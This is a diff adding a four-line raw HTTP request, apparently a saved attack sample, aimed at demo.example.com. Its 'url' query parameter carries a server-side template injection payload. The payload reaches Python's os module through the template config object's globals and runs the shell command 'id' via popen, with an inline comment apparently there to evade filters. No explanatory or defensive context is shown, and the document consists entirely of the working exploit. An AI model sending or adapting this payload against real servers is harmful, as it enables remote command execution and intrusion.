@@ -1,0 +1,4 @@
+GET /a?url={{/*x*/config.__class__.__init__.__globals__['os'].popen('id').read()}} HTTP/1.1
+Host: demo.example.com
+Connection: close
+
